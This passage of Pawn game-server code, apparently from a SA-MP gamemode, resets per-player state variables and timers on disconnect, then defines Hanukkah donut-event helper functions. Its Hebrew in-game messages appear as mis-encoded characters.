	if(playerinfo[playerid][dcd][0] > 0) KillTimer(playerinfo[playerid][dcd][1]);
	playerinfo[playerid][dcd][0] = 0;
	if(discon && playerinfo[playerid][prinvited] != -1) playerinfo[playerinfo[playerid][prinvited]][prinvited] = -1, playerinfo[playerid][prinvited] = -1;
	playerinfo[playerid][prinvited] = -1;
	playerinfo[playerid][prinviter] = 0;
	playerinfo[playerid][inprace] = 0;
	if(playerinfo[playerid][prcd][0] > 0) KillTimer(playerinfo[playerid][prcd][1]);
	playerinfo[playerid][prcd][0] = 0;
	if(discon && playerinfo[playerid][binvited] != -1) playerinfo[playerinfo[playerid][binvited]][binvited] = -1, playerinfo[playerid][binvited] = -1;
	playerinfo[playerid][binvited] = -1;
	playerinfo[playerid][binviter] = 0;
	playerinfo[playerid][battlex] = 0.0;
	playerinfo[playerid][battley] = 0.0;
	playerinfo[playerid][battlez] = 0.0;
	if(playerinfo[playerid][inbattle]) KillTimer(playerinfo[playerid][battletimer]);
	playerinfo[playerid][inbattle] = 0;
	playerinfo[playerid][noend] = 0;
	playerinfo[playerid][bstyle] = {-1,-1};
	playerinfo[playerid][bplace] = -1;
	playerinfo[playerid][btime] = 0;
	if(discon && playerinfo[playerid][bcd][0] > 0) KillTimer(playerinfo[playerid][bcd][1]);
	playerinfo[playerid][bcd][0] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][aapos][i] = 0.0;
	playerinfo[playerid][aasetp] = 0;
	if(discon && playerinfo[playerid][mute][0] > 0) KillTimer(playerinfo[playerid][mute][1]);
	playerinfo[playerid][mute][0] = 0;
	if(discon && playerinfo[playerid][jail][0] > 0) KillTimer(playerinfo[playerid][jail][1]);
	playerinfo[playerid][jail][0] = 0;
	playerinfo[playerid][togsay] = 0;
	playerinfo[playerid][showme] = 1;
	playerinfo[playerid][spectate] = -1;
	playerinfo[playerid][specbuttons] = true;
	playerinfo[playerid][aause] = 0;
	playerinfo[playerid][aaveh] = {-1,-1,-1,-1,-1};
	playerinfo[playerid][aaobj] = {-1,-1,-1,-1,-1};
	playerinfo[playerid][aaparam] = 0;
	playerinfo[playerid][bonus] = {0,0,0,0};
	PlayerLeaveGang(playerid,0);
	playerinfo[playerid][gang] = 0;
	playerinfo[playerid][igang] = 0;
	//for(new i=0;i<max_objects;i++) if(IsValidPlayerObject(playerid,i)) DestroyPlayerObject(playerid,i);
	playerinfo[playerid][phone] = -1;
	playerinfo[playerid][phonemodel] = 0;
	playerinfo[playerid][phonedesign] = white;
	playerinfo[playerid][phoneoption] = -1;
	playerinfo[playerid][calling] = -1;
	playerinfo[playerid][canswer] = 0;
	playerinfo[playerid][callid] = 0;
	playerinfo[playerid][caller] = 0;
	playerinfo[playerid][callcash] = 0;
	playerinfo[playerid][publicphone] = 0;
	playerinfo[playerid][class] = -1;
	playerinfo[playerid][waitkart] = 0;
	playerinfo[playerid][inkart] = 0;
	playerinfo[playerid][waitmonster] = 0;
	playerinfo[playerid][inmonster] = 0;
	playerinfo[playerid][vip] = 0;
	playerinfo[playerid][gw] = 0;
	playerinfo[playerid][reqclass] = 1;
	#if hanukkah_now
	playerinfo[playerid][donuttime] = 0;
	playerinfo[playerid][donut] = 0;
	#endif
	for(new i = 0; i < max_ammunation_items; i++) playerinfo[playerid][ammuitems][AmmunationSpecialItems[i][aiID]] = false, playerinfo[playerid][ammuitemammo][AmmunationSpecialItems[i][aiID]] = 0;
	dbg(100,"5");
	if(playerinfo[playerid][gm])
	{
		if(IsPlayerInAnyVehicle(playerid)) if(vehicleinfo[GetPlayerVehicleID(playerid)][vgm])
		{
			SetVehicleHealth(GetPlayerVehicleID(playerid),1000.0);
			vehicleinfo[GetPlayerVehicleID(playerid)][vgm] = 0;
		}
		SetPlayerHealth(playerid,100.0);
	}
	playerinfo[playerid][gm] = 0;
	for(new i=0;i<props;i++) if(propinfo[i][owner] == playerid) propinfo[i][owner] = INVALID_PLAYER_ID;
	playerinfo[playerid][inact] = 0;
	for(new i=0;i<2;i++) playerinfo[playerid][lastcoords][i] = 0.0;
	playerinfo[playerid][nocmd] = 0;
	playerinfo[playerid][nomsg] = 0;
	playerinfo[playerid][nopm] = 0;
	playerinfo[playerid][noname] = 0;
	playerinfo[playerid][mtime] = 0;
	dbg(100,"6");
	for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = 0.0;
	playerinfo[playerid][mark2] = {0,world_normal,0};
	playerinfo[playerid][flood] = {0,0,0,0};
	playerinfo[playerid][fwarns] = {0,0,0};
	playerinfo[playerid][floodsecs] = 0;
	format(playerinfo[playerid][tag],M_S,"");
	playerinfo[playerid][tagcol] = -1;
	for(new i=0;i<4;i++) playerinfo[playerid][slastpos][i] = 0.0;
	playerinfo[playerid][slastdata] = {0,0,0,0};
	playerinfo[playerid][incam] = 0;
	playerinfo[playerid][gmtimer] = 0;
	playerinfo[playerid][unftimer] = 0;
	playerinfo[playerid][recptimer] = 0;
	playerinfo[playerid][gmlasthp] = 100.0;
	playerinfo[playerid][lastskin] = GetPlayerSkin(playerid);
	playerinfo[playerid][dmzkills] = 0;
	playerinfo[playerid][frozen] = {0,0};
	for(new i=0;i<3;i++) playerinfo[playerid][freezepos][i] = 0.0;
	dbg(100,"7");
	playerinfo[playerid][blockpms] = 0;
	playerinfo[playerid][blockgoto] = 0;
	playerinfo[playerid][lastmoney] = 0;
	playerinfo[playerid][cana] = {1,1};
	playerinfo[playerid][cans] = 1;
	playerinfo[playerid][canafk] = 2;
	playerinfo[playerid][cantelep] = 1;
	playerinfo[playerid][canhitman] = 1;
	playerinfo[playerid][canrob] = 1;
	playerinfo[playerid][xjail] = 0;
	playerinfo[playerid][die] = 0;
	playerinfo[playerid][fkwarns] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][speedpos][i] = 0.0;
	if(discon && playerinfo[playerid][modeafk]) TextDrawHideForPlayer(playerid,unafktext);
	playerinfo[playerid][modeafk] = 0;
	playerinfo[playerid][usedafk] = 0;
	SetString(playerinfo[playerid][afkreason],"");
	playerinfo[playerid][waitsrace] = 0;
	playerinfo[playerid][insrace] = 0;
	playerinfo[playerid][sracecp] = 0;
	playerinfo[playerid][sraceid] = 0;
	playerinfo[playerid][hitman] = 0;
	PlayerLeaveClan(playerid,false);
	playerinfo[playerid][clan] = 0;
	playerinfo[playerid][lclan] = 1;
	playerinfo[playerid][clantag][0] = 0;
	playerinfo[playerid][sadmin] = 0;
	playerinfo[playerid][wlevel] = 0;
	playerinfo[playerid][wantedlevel] = 0;
	dbg(100,"8");
	if(playerinfo[playerid][bomb] == 55) DestroyPickupEx(playerinfo[playerid][bombpickup]);
	playerinfo[playerid][bomb] = 0;
	playerinfo[playerid][bombkills] = 0;
	playerinfo[playerid][bombdmg] = 0;
	playerinfo[playerid][banned] = 0;
	playerinfo[playerid][house] = -1;
	playerinfo[playerid][showhouse] = 0;
	for(new i=0;i<max_houses;i++) playerinfo[playerid][houseacc][i] = 0, playerinfo[playerid][acctested][i] = 0;
	playerinfo[playerid][inhouse] = -1;
	playerinfo[playerid][jetpack] = 0;
	playerinfo[playerid][pleasemoney] = 0;
	playerinfo[playerid][pmath] = -1;
	playerinfo[playerid][angry] = {0,0};
	playerinfo[playerid][pinv] = 0;
	playerinfo[playerid][ptrivia] = -1;
	playerinfo[playerid][bonus_si] = 0;
	playerinfo[playerid][canp] = 1;
	format(playerinfo[playerid][lastvmessage],M_S," ");
	dbg(100,"9");
	playerinfo[playerid][vheal] = 0;
	playerinfo[playerid][vrocket] = 0;
	playerinfo[playerid][vsuicide] = {0,-1};
	playerinfo[playerid][nr] = 0;
	playerinfo[playerid][boomcar] = 0;
	playerinfo[playerid][abf] = {0,INVALID_VEHICLE_ID};
	playerinfo[playerid][nswarns] = 0;
	playerinfo[playerid][noobwarns] = 0;
	playerinfo[playerid][wehateyou] = -1;
	dbg(100,"10");
	playerinfo[playerid][lastpm] = INVALID_PLAYER_ID;
	playerinfo[playerid][waitkickstar] = 0;
	playerinfo[playerid][inkickstar] = 0;
	playerinfo[playerid][kickstarid] = -1;
	playerinfo[playerid][kickstarscore] = 0;
	playerinfo[playerid][kickstarprize] = 0;
	playerinfo[playerid][kickstarbonus] = 0;
	playerinfo[playerid][cranetime] = 0;
	playerinfo[playerid][incrane] = 0;
	playerinfo[playerid][lastammo] = 0;
	playerinfo[playerid][lastweapon] = 0;
	playerinfo[playerid][dscmd] = 0;
	playerinfo[playerid][indialog] = -1;
	playerinfo[playerid][lastdialog] = -1;
	playerinfo[playerid][tinfo] = 0;
	playerinfo[playerid][inarea51] = 0;
	playerinfo[playerid][inplane] = 0;
	playerinfo[playerid][inshooting] = -1;
	playerinfo[playerid][doneshooting] = {0,0,0,0,0,0,0};
	playerinfo[playerid][instunting] = -1;
	playerinfo[playerid][donestunting] = {0,0,0,0,0,0,0,0,0,0,0,0};
	playerinfo[playerid][savedweapons] = {0,0,0,0,0,0,0,0,0,0,0,0,0};
	playerinfo[playerid][savedammo] = {0,0,0,0,0,0,0,0,0,0,0,0,0};
	SetPlayerFightingStyle(playerid,playerinfo[playerid][setting][setting_fs] == 1 ? 15 : playerinfo[playerid][setting][setting_fs] + 3);
	playerinfo[playerid][clickplayer] = INVALID_PLAYER_ID;
	playerinfo[playerid][clickon] = 0;
	playerinfo[playerid][cclick] = {clan_none,clan_none,clan_none};
	playerinfo[playerid][cclickparamint] = 0;
	playerinfo[playerid][cclickparam][0] = 0;
	playerinfo[playerid][duelclick] = -1;
	playerinfo[playerid][raise] = INVALID_PLAYER_ID;
	playerinfo[playerid][raisef] = 0;
	playerinfo[playerid][raiseby] = INVALID_PLAYER_ID;
	playerinfo[playerid][pump] = INVALID_PLAYER_ID;
	for(new i = 0; i < 50; i++) playerinfo[playerid][upgradecmd][i] = 1;
	playerinfo[playerid][underearth] = 0;
	playerinfo[playerid][mapolet] = {0,0,0,0,0,0,0};
	playerinfo[playerid][mapolets] = 0;
	playerinfo[playerid][quicklydefence] = 0;
	playerinfo[playerid][phealth] = 0.0;
	playerinfo[playerid][parmour] = 0.0;
	playerinfo[playerid][gmwarns] = 0;
	playerinfo[playerid][getweapon] = 0;
	playerinfo[playerid][pweapon] = 0;
	playerinfo[playerid][pammo] = 0;
	playerinfo[playerid][pspentammo] = 0;
	playerinfo[playerid][shootbugwarns] = {0,0};
	playerinfo[playerid][tornado] = 0;
	for(new i = 0; i < 3; i++) playerinfo[playerid][torpos][i] = 0.0;
	playerinfo[playerid][storm] = 0;
	for(new i = 0; i < 3; i++) playerinfo[playerid][storpos][i] = 0.0;
	playerinfo[playerid][erase] = 0;
	for(new i = 0; i < 3; i++) playerinfo[playerid][erapos][i] = 0.0;
	playerinfo[playerid][erasehurt] = 0;
	playerinfo[playerid][wskill] = {999,999,999,999,999,999,999,999,999,999,999};
	playerinfo[playerid][ostate] = 0;
	playerinfo[playerid][nstate] = 0;
	playerinfo[playerid][lastv] = INVALID_VEHICLE_ID;
	for(new i = 0; i < MAX_RANKS; i++) playerinfo[playerid][rank][i] = 0;
	for(new i = 0; i < max_properties; i++) playerinfo[playerid][earns][i] = 0, playerinfo[playerid][propcost][i] = 0;
	playerinfo[playerid][propscount] = 0;
	playerinfo[playerid][proptime] = 0;
	if(playerinfo[playerid][diehard][0]) KillTimer(playerinfo[playerid][diehard][1]);
	playerinfo[playerid][diehard] = {0,0};
	if(playerinfo[playerid][lifegood][0]) KillTimer(playerinfo[playerid][lifegood][1]);
	playerinfo[playerid][lifegood] = {0,0};
	playerinfo[playerid][rcontrys] = 0;
	if(playerinfo[playerid][apslap][0] > 0) KillTimer(playerinfo[playerid][apslap][1]);
	playerinfo[playerid][apslap] = {0,-1};
	playerinfo[playerid][cvcolor] = 0;
	playerinfo[playerid][inmarea] = -1;
	playerinfo[playerid][hshots] = 0;
	playerinfo[playerid][tables] = 0;
	playerinfo[playerid][lcallow] = 0;
	playerinfo[playerid][voted] = 0;
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		playerinfo[playerid][ignore][i] = 0;
		playerinfo[playerid][killsforid][i] = 0;
		playerinfo[i][killsforid][playerid] = 0;
		playerinfo[playerid][damageforid][i] = false;
		playerinfo[i][damageforid][playerid] = false;
		playerinfo[playerid][carjack][i] = 1;
		if(playerinfo[i][lastpm] == playerid) playerinfo[i][lastpm] = INVALID_PLAYER_ID;
	}
	playerinfo[playerid][waitewar] = 0;
	playerinfo[playerid][inewar] = 0;
	playerinfo[playerid][pwol] = 0;
	if(lottonum[1] == playerid) lottonum[1] = -1;
	if(dlottonum[1] == playerid) dlottonum[1] = -1;
	if(maths[5] == playerid) maths[5] = -1;
	if(trivia[1] == playerid) trivia[1] = -1;
	playerinfo[playerid][cancarjump] = 0;
	playerinfo[playerid][incwar] = 0;
	playerinfo[playerid][hell] = 0;
	playerinfo[playerid][helmet] = 0;
	playerinfo[playerid][fastkilling] = {0,0};
	playerinfo[playerid][copytext][0] = 0;
	format(playerinfo[playerid][rdate],32,"рщя");
	if(discon) if(playerinfo[playerid][p3dtext] != Text3D:INVALID_3DTEXT_ID) RemovePlayerAttachedText(playerid);
	playerinfo[playerid][p3dtext] = Text3D:INVALID_3DTEXT_ID;
	playerinfo[playerid][cdfrozen] = 0;
	playerinfo[playerid][pingtest] = {0,0,0};
	playerinfo[playerid][apingtest] = {0,INVALID_PLAYER_ID};
	playerinfo[playerid][inhq] = 0;
	playerinfo[playerid][invhq] = 0;
	playerinfo[playerid][teleportedhq] = 0;
	playerinfo[playerid][parea] = -1;
	playerinfo[playerid][tparea] = -1;
	playerinfo[playerid][energy] = 0;
	playerinfo[playerid][lasteupdate] = {0,0};
	playerinfo[playerid][energyrate] = {12,1};
	playerinfo[playerid][fttused] = 0;
	playerinfo[playerid][waitwargame] = 0;
	playerinfo[playerid][inwargame] = 0;
	playerinfo[playerid][spweapon] = spw_none;
	playerinfo[playerid][spwammo] = 0;
	playerinfo[playerid][godpower] = 0;
	playerinfo[playerid][poption] = 0;
	playerinfo[playerid][ach] = {-1,0,-1};
	playerinfo[playerid][choosenach] = 0;
	playerinfo[playerid][pkeys] = {0,0};
	playerinfo[playerid][opatest] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][speedtest][i] = 0.0;
	playerinfo[playerid][dontac] = 0;
	playerinfo[playerid][specallowed] = 0;
	playerinfo[playerid][usetele] = 0;
	playerinfo[playerid][using22] = 0;
	playerinfo[playerid][curfight] = 0;
	playerinfo[playerid][tut] = {-1,0,0};
	playerinfo[playerid][poisoned] = 0;
	playerinfo[playerid][poisonhp] = 0.0;
	playerinfo[playerid][psniperbullets] = 0;
	playerinfo[playerid][speedo] = INVALID_PLAYER_TEXT_DRAW;
	playerinfo[playerid][pspeed] = 0.0;
	for(new i = 0; i < 3; i++) playerinfo[playerid][speedup][i] = 0.0;
	playerinfo[playerid][pkmh] = 0;
	playerinfo[playerid][team] = -1;
	playerinfo[playerid][iteam] = -1;
	playerinfo[playerid][lteam] = 0;
	playerinfo[playerid][hearinggate] = -1;
	playerinfo[playerid][waitmanhunt] = 0;
	playerinfo[playerid][inmanhunt] = 0;
	playerinfo[playerid][manhuntid] = 0;
	playerinfo[playerid][waitsport] = 0;
	playerinfo[playerid][insport] = 0;
	playerinfo[playerid][sportid] = -1;
	playerinfo[playerid][sportscore] = 0;
	playerinfo[playerid][sportparam] = 0;
	playerinfo[playerid][noupdate] = 0;
	playerinfo[playerid][usepower] = 0;
	if(playerinfo[playerid][powerparam] > powerparam_none) StopUsingPower(playerid);
	playerinfo[playerid][powerparam] = powerparam_none;
	playerinfo[playerid][upowerkeys] = DEFAULT_UPOWER_KEYS;
	playerinfo[playerid][upowerkeys2] = DEFAULT_UPOWER2_KEYS;
	playerinfo[playerid][upkeyschanging] = 0;
	format(playerinfo[playerid][mngpower],64,"");
	playerinfo[playerid][acwarns] = 0;
	playerinfo[playerid][usedcmd] = -1;
	playerinfo[playerid][mapt] = 0;
	if(playerinfo[playerid][srstarted]) StopShootingRange(playerid);
	playerinfo[playerid][srstarted] = 0;
	playerinfo[playerid][srweapon] = 0;
	playerinfo[playerid][srseconds] = 0;
	playerinfo[playerid][srscore] = 0;
	playerinfo[playerid][srtotal] = 0;
	playerinfo[playerid][srlevel] = 0;
	playerinfo[playerid][srin] = 0;
	playerinfo[playerid][srobjs] = 0;
	playerinfo[playerid][srobj] = {-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};
	playerinfo[playerid][idletime] = 0;
	format(playerinfo[playerid][s0beitdate1],11,"");
	format(playerinfo[playerid][s0beitdate2],11,"");
	format(playerinfo[playerid][s0beitdate3],11,"");
	dbg(100,"11");
	if(discon) if(IsFlying(playerid)) StopFlying(playerid);
	if(discon)
	{
		for(new i = 0; i < max_temptexts; i++)
		{
			if(playerinfo[playerid][temptext][i] != INVALID_PLAYER_TEXT_DRAW)
			{
				if(playerinfo[playerid][temptexttimer][i] != -1) KillTimer2(playerinfo[playerid][temptexttimer][i]);
				TempTextDraw(playerid,i,playerinfo[playerid][temptextdes][i]);
			}
			playerinfo[playerid][temptext][i] = INVALID_PLAYER_TEXT_DRAW, playerinfo[playerid][temptextid][i] = temptext_none, playerinfo[playerid][temptextdes][i] = 0, playerinfo[playerid][temptexttimer][i] = -1;
		}
	}
	for(new i = 0; i < 3; i++) playerinfo[playerid][waterpos][i] = 0.0;
	playerinfo[playerid][waterobj] = -1;
	playerinfo[playerid][lredirection] = 0;
	playerinfo[playerid][dontwac] = 0;
	playerinfo[playerid][headshooter] = 0;
	playerinfo[playerid][energyrelease] = INVALID_PLAYER_ID;
	playerinfo[playerid][energypump] = INVALID_PLAYER_ID;
	playerinfo[playerid][energystraw] = INVALID_PLAYER_ID;
	playerinfo[playerid][cursed] = INVALID_PLAYER_ID;
	playerinfo[playerid][useddevilcurse] = INVALID_PLAYER_ID;
	for(new i = 0; i < 3; i++) playerinfo[playerid][deathpos] = 0;
	playerinfo[playerid][deathdelay] = 0;
	for(new i = 0; i < MAX_ADMIN_VEHICLES; i++) playerinfo[playerid][createdv][i] = INVALID_VEHICLE_ID;
	playerinfo[playerid][createdvs] = 0;
	format(playerinfo[playerid][report],64,"");
	playerinfo[playerid][reportid] = INVALID_PLAYER_ID;
	playerinfo[playerid][reports] = 0;
	//playerinfo[playerid][spawnmoneydelay] = 0;
	playerinfo[playerid][lhopt] = -1;
	playerinfo[playerid][lhiconshowing] = 0;
	playerinfo[playerid][waitarmy] = 0;
	playerinfo[playerid][inarmy] = 0;
	playerinfo[playerid][changedinterior] = 0;
	playerinfo[playerid][ball] = 0;
	playerinfo[playerid][ballv] = -1;
	playerinfo[playerid][hqcheck] = -1;
	playerinfo[playerid][test] = -1;
	playerinfo[playerid][rocketsent] = 0;
	playerinfo[playerid][pmlist] = 0;
	playerinfo[playerid][securitydelay] = 0;
	playerinfo[playerid][loadpos] = 0;
	playerinfo[playerid][org] = 0;
	playerinfo[playerid][lorg] = 0;
	playerinfo[playerid][orgtag][0] = 0;
	playerinfo[playerid][castle] = INVALID_CASTLE_ID;
	playerinfo[playerid][mission] = INVALID_MISSION_ID;
	dbg(100,"12");
	for(new i = 0; i < max_wtypes; i++) playerinfo[playerid][wtype][i] = WeaponTypes[i][wtWeapons][0];
	for(new i = 0; i < max_txd; i++) playerinfo[playerid][showingtxd][i] = 0;
	playerinfo[playerid][tooktempickup] = 0;
	playerinfo[playerid][waterwalk] = {0,0};
	for(new i = 0; i < 2; i++) playerinfo[playerid][boomtd][i] = INVALID_TEXT_DRAW;
	playerinfo[playerid][boomtimer] = -1;
	playerinfo[playerid][music] = 0;
	playerinfo[playerid][youtube][0] = 0;
	playerinfo[playerid][nstate] = GetPlayerState_Original(playerid);
	playerinfo[playerid][noticedmsg] = {0,0,0,0,0,0,0,-1,0,0,0,0,0,0,0,0,0,0,0,-1,-1,0};
	playerinfo[playerid][lastrec] = 0;
	playerinfo[playerid][lastaga] = 0;
	playerinfo[playerid][friendask] = INVALID_PLAYER_ID;
	playerinfo[playerid][friends] = 0;
	playerinfo[playerid][invehicle] = INVALID_VEHICLE_ID;
	playerinfo[playerid][watchingwindow] = 0;
	playerinfo[playerid][pcode] = {0,0,INVALID_PLAYER_ID,0};
	for(new i = 0; i < MAX_PPT; i++) if(pptinfo[i][pptValid]) playerinfo[playerid][ppts][i] = (PlayerText3D:1024);
	playerinfo[playerid][usedfind] = 0;
	playerinfo[playerid][punch] = 0;
	playerinfo[playerid][access] = {0,0};
	format(playerinfo[playerid][question],128,"");
	playerinfo[playerid][answeredby] = INVALID_PLAYER_ID;
	playerinfo[playerid][pickup] = -1;
	playerinfo[playerid][range] = 0.0;
	playerinfo[playerid][attype] = at_none;
	playerinfo[playerid][waitteamact] = 0;
	playerinfo[playerid][inteamact] = 0;
	playerinfo[playerid][teamactid] = -1;
	playerinfo[playerid][teamactteam] = 0;
	playerinfo[playerid][supportask] = 0;
	playerinfo[playerid][supporting] = INVALID_PLAYER_ID;
	playerinfo[playerid][gamesclick] = {0,0};
	playerinfo[playerid][scroll] = scroll_none;
	playerinfo[playerid][scrolltime] = -1;
	playerinfo[playerid][scrollusing] = 0;
	playerinfo[playerid][waitzombies] = 0;
	playerinfo[playerid][inzombies] = 0;
	playerinfo[playerid][zombiesid] = 0;
	playerinfo[playerid][zombiesweapon] = -1;
	playerinfo[playerid][lasttele] = -1;
	for(new i = 0; i < sizeof(Teleports); i++) playerinfo[playerid][rated][i] = false;
	playerinfo[playerid][jumpower] = -1;
	playerinfo[playerid][waitglass] = 0;
	playerinfo[playerid][inglass] = 0;
	playerinfo[playerid][target] = INVALID_PLAYER_ID;
	playerinfo[playerid][clearanims] = 0;
	playerinfo[playerid][stoprob] = 0;
	playerinfo[playerid][robbed] = 0;
	playerinfo[playerid][tfostatus] = tfo_none;
	playerinfo[playerid][vtemp] = INVALID_VEHICLE_ID;
	playerinfo[playerid][entertime] = 0;
	format(playerinfo[playerid][reconnecting],16,"");
	playerinfo[playerid][purim] = -1;
	playerinfo[playerid][playingmusic] = 0;
	playerinfo[playerid][botwarns] = 0;
	playerinfo[playerid][dialogresp] = 0;
	playerinfo[playerid][sfsteps] = -1;
	playerinfo[playerid][sfhold] = -1;
	playerinfo[playerid][sfparam] = fade_none;
	for(new i = 0; i < KILL_TESTS; i++) playerinfo[playerid][lastkills][i] = INVALID_PLAYER_ID;
	playerinfo[playerid][tricking] = {0,0};
	playerinfo[playerid][updatewkills] = 0;
	playerinfo[playerid][savingmoney] = {0,0};
	playerinfo[playerid][lasthptext] = {0,0};
	playerinfo[playerid][playerprize] = 0;
	playerinfo[playerid][shavuot] = 0;
	playerinfo[playerid][editing] = edit_null;
	playerinfo[playerid][clothes] = -1;
	playerinfo[playerid][clothes2] = -1;
	for(new i = 0; i < 6; i++) playerinfo[playerid][clothesp][i] = 0.0, playerinfo[playerid][clothes2p][i] = 0.0;
	playerinfo[playerid][clothesclick] = {0,0,0};
	playerinfo[playerid][fmsg] = {0,0};
	playerinfo[playerid][fmsggo] = {0,0};
	for(new i = 0, m = GetSettingItemsCount(0); i < m; i++) playerinfo[playerid][getsetting][i] = 0;
	playerinfo[playerid][removespac] = 0;
	playerinfo[playerid][punishdia] = INVALID_PLAYER_ID;
	playerinfo[playerid][sniping] = 0;
	for(new i = 0; i < 24; i++) playerinfo[playerid][border][i] = INVALID_PLAYER_TEXT_DRAW;
	for(new i = 0; i < 3; i++) playerinfo[playerid][borderrgb] = 0;
	playerinfo[playerid][borderalpha] = 2;
	playerinfo[playerid][bordervis] = 0;
	playerinfo[playerid][bordershow] = 1;
	playerinfo[playerid][editingborder] = 0;
	playerinfo[playerid][reloadingt] = 0;
	playerinfo[playerid][afkcmd] = 0;
	playerinfo[playerid][setspawn][0] = 0;
	playerinfo[playerid][interpolating] = {0,ipath_none};
	for(new i = 0; i < MAX_STREAMED_VEHICLES; i++) playerinfo[playerid][streamedvehicles][i] = INVALID_VEHICLE_ID;
	playerinfo[playerid][streamedvehiclesmax] = 0;
	playerinfo[playerid][bangun] = 0;
	playerinfo[playerid][kickgun] = 0;
	playerinfo[playerid][guntext] = Text3D:INVALID_3DTEXT_ID;
	playerinfo[playerid][guntime] = 0;
	playerinfo[playerid][invitetime] = {MAX_INVITES,0};
	playerinfo[playerid][showstats] = INVALID_PLAYER_ID;
	playerinfo[playerid][selectingpos] = {-1,0,0};
	playerinfo[playerid][paytimer] = {0,INVALID_PLAYER_ID,-1};
	playerinfo[playerid][iadminot] = {0,0,-1};
	playerinfo[playerid][entermessage] = {-1,0,-1,0,white,white};
	playerinfo[playerid][hitfuel] = 0;
	for(new i = 0; i < MAX_OBJECTIVES; i++) playerinfo[playerid][objective][i] = false;
	playerinfo[playerid][friendclick] = -1;
	playerinfo[playerid][chatinvite] = INVALID_PLAYER_ID;
	playerinfo[playerid][inchat] = INVALID_PLAYER_ID;
	playerinfo[playerid][chatjointime][0] = EOS;
	playerinfo[playerid][minchat] = false;
	VMC_Reset(playerid);
	for(new i = 0; i < max_atoggles; i++) playerinfo[playerid][atoggle][i] = false;
	playerinfo[playerid][bugarmour] = 0;
	playerinfo[playerid][infountain] = 0;
	playerinfo[playerid][selfnpc] = -1;
	playerinfo[playerid][waitbriefcase] = 0;
	playerinfo[playerid][inbriefcase] = 0;
	for(new i = 0; i < 4; i++) playerinfo[playerid][gambleimg][i] = INVALID_PLAYER_TEXT_DRAW;
	playerinfo[playerid][gambleinfo] = {0,0,0,-1,-1,-1};
	for(new i = 0; i < max_silence_types; i++) playerinfo[playerid][silence][i] = 0;
    playerinfo[playerid][iplogin] = 0;
	playerinfo[playerid][usedkill] = 0;
    playerinfo[playerid][failedword] = 0;
    playerinfo[playerid][usedammu] = false;
	playerinfo[playerid][pickupteleporting] = 0;
	playerinfo[playerid][fknewac] = 0;
	playerinfo[playerid][sguard] = {0,0};
	for(new i = 0; i < 13; i++) playerinfo[playerid][acweapons][i] = false;
	for(new i = 0; i < 13; i++) playerinfo[playerid][acammon][i] = 0;
	playerinfo[playerid][warned] = false;
	playerinfo[playerid][warnings] = 0;
	playerinfo[playerid][pModelPage] = 0;
	playerinfo[playerid][pModelID] = 0;
	playerinfo[playerid][pModelActive] = false;
	KillTimer(playerinfo[playerid][bcd][1]);
	KillTimer(playerinfo[playerid][bcd][0]);
	playerinfo[playerid][clancam] = -1;
	playerinfo[playerid][flymode] = {0,0,0,0,0};
	playerinfo[playerid][flyobject] = INVALID_OBJECT_ID;
	playerinfo[playerid][flyspeed] = 0.0;
	playerinfo[playerid][flytype] = fmt_none;
	playerinfo[playerid][admingangzone] = INVALID_GANG_ZONE;
	for(new i = 0; i < 47; i++) playerinfo[playerid][pShootTC][i] = 0;
	playerinfo[playerid][incbug] = {0,0,0,0};
	playerinfo[playerid][bestcbug] = 0.0;
	for(new i = 0; i < 20; i++) playerinfo[playerid][usedcode][i] = false;
	dbg(100,"13");
	return 1;
}
#if hanukkah_now
//=[donut_give]=================================================================
stock donut_give(playerid, amount)
{
	playerinfo[playerid][donut] += amount;
	fsetint(fuser(playerid), "donuts", playerinfo[playerid][donut]);
	fsetint(fuser(playerid), "donut_total", fgetint(fuser(playerid), "donut_total") + amount);
}
//=[donut_spc]==================================================================
stock donut_spc(playerid)
{
    fsetint(fuser(playerid),"PVehicle3",406);
	fsetint(fuser(playerid),"VehicleCost3",2000000);
	playerinfo[playerid][vehicle][5] = fgetint(fuser(playerid),"PVehicle3");
    SendClientMessage(playerid, -1, "/callv3 - {FFCC00}ь∙щтх° ф°ыс");
}
//=[donut_sell]=================================================================
stock donut_sell(playerid, prizeid)
{
	/*new str[M_S];
	format(str, sizeof(str), " .%s ўЁщ· р· фюхЎ°", donutshop[prizeid][desc]);
	SendClientMessage(playerid, green, str);
	playerinfo[playerid][donut] -= donutshop[prizeid][dprice];
	fsetint(fuser(playerid), "donuts", playerinfo[playerid][donut]);
	new w;
	switch(prizeid)
	{
	    case 0: GiveMoney(playerid, 75000, 0);
	    case 1: GiveMoney(playerid, 200000, 0);
	    case 2: GiveMoney(playerid, 500000, 0);
	    case 3: GiveWeapon(playerid, 35, 3);
	    case 4: GiveWeapon(playerid, 35, 10);
	    case 5: GiveJetpack(playerid);
		case 6:
		{
			switch(random(100))
			{
				case 0:
				{
				    w = 1;
					SendClientMessage(playerid, 0xFFCC00FF, "!!!цыщ· сёсщсхя фющхчу");
					format(str, sizeof(str), "[/DONUTSHOP]: !!!цыф сёсщсхя фющхчу %s ф∙чўя", GetName(playerid));
					SendClientMessageToAll(0xFFCC00FF, str);
					if(!playerinfo[playerid][vehicle][5]) donut_spc(playerid);
					else ShowPlayerDialog(playerid, dialog_hanukkah2, DIALOG_STYLE_MSGBOX, "{FFCC00}!цыщ·", "{FFCC00} !цыщ· сёсщсхя фющхчу\n{FFFFFF}фюЄ°ы· цщф·ф ∙ыс° ўщщэ ьъ °ыс ∙ьщ∙щ сю∙·ю∙\n?фрэ с°ЎхЁъ ьючхў р· ф°ыс фЁхычщ хьфчьщЇх сёсщсхя", "{FFCC00}ыя", "{FFCC00}ьр");
				}
				case 1..19: SendClientMessage(playerid, red, " !цыщ· с.... ыьхэ");
				case 20..25: SendClientMessage(playerid, green, " !цыщ· с10 ёхЇтЁщх·"), donut_give(playerid, 10);
				case 26..100: SendClientMessage(playerid, green, " .цыщ· с100 рьє ухь°"), GiveMoney(playerid, 100000, 0);
			}
		}
	}
	if(!w) ShowPlayerConstDialog(playerid, dialog_hanukkah);*/
}
//=[cand_create]================================================================
stock cand_create(id)
{
	DestroySObject(cand[id][objid]);
	cand[id][objid] = CreateObject(3461, cand[id][eepx], cand[id][eepy], cand[id][eepz] + 1, 0.0, 0.0, 0.0, 300);
}
//=[cand_check]=================================================================
stock cand_check()
{
	new d;
